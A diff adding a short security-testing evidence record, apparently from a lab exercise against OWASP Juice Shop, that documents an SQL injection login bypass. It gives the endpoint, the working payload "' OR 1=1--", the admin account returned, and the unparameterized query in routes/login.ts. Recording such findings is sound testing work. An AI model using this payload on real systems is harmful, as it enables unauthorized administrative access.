@@ -1,0 +1,23 @@
+SQL Injection Authentication Bypass
+Endpoint:
+POST /rest/user/login
+Payload:
+{"email":"' OR 1=1--","password":"anything"}
+Result:
+HTTP 200 OK
+Authentication bypass confirmed.
+Returned account:
+Email: admin@juice-sh.op
+Role: admin
+Impact:
+An unauthenticated attacker can manipulate the login SQL query
+and obtain an authenticated administrative session.
+Source-code evidence:
+routes/login.ts directly interpolates req.body.email into the
+SQL query without parameterization.
+JWT:
+Received successfully; full token intentionally omitted from
+this evidence record to avoid storing a live authentication token.
+Classification:
+Confirmed SQL Injection / Authentication Bypass
+Severity: Critical (provisional)
